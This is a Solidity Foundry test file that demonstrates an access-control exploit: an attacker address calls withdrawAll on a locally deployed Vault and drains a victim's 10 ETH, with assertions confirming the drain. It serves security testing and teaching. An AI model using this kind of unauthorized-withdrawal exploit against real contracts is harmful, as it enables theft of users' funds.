// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/Vault.sol";

contract AccessControl is Test {
    Vault public vault;
    address victim;
    address attacker;

    function setUp() public {
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        // Deploy vault as victim
        vm.startPrank(victim);
        vault = new Vault();

        // Victim deposits ETH into the vault
        vm.deal(victim, 10 ether);
        vault.deposit{ value: 10 ether }();
        vm.stopPrank();
    }

    function testAccessControlAttack() public {
        console.log("=== ACCESS CONTROL ATTACK DEMO ===\n");

        uint256 balanceBefore = attacker.balance;
        console.log("Vault balance before attack:", vault.balance() / 1e18, "ETH");
        console.log("Attacker balance before:   ", balanceBefore / 1e18, "ETH");

        vm.startPrank(attacker);
        // Attacker drains the vault
        console.log("\n[!] Executing access control attack...\n");
        vault.withdrawAll(payable(attacker));
        vm.stopPrank();

        uint256 balanceAfter = attacker.balance;
        console.log("Vault balance after attack:", vault.balance() / 1e18, "ETH");
        console.log("Attacker balance before:   ", balanceAfter / 1e18, "ETH");

        assertGt(balanceAfter, balanceBefore);
        assertEq(address(vault).balance, 0); // Vault drained
    }
}
